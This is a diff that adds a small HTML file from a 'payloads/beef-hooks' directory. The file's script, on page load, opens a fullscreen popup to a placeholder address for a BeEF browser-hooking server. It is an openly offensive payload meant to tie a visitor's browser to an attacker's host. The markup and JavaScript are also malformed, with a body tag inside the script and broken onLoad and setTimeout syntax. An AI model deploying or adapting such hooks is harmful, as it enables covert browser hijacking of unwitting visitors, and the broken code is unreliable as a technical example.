+++ payloads/beef-hooks/beef-test
@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script type="text/javascript">
+          function popup(url) 
+      {
+       params  = 'width='+screen.width;
+       params += ', height='+screen.height;
+       params += ', top=0, left=0'
+       params += ', fullscreen=yes';
+
+       newwin=window.open(url,'windowname4', params);
+       }
+
+    
+<body window.onLoad{
+setTimeout(
+popup('http://<IP-ADDRESS_N_HOOK>'){
+4000
+)};>
+    </script>
+  </head>
+    </body>
+</html>
+
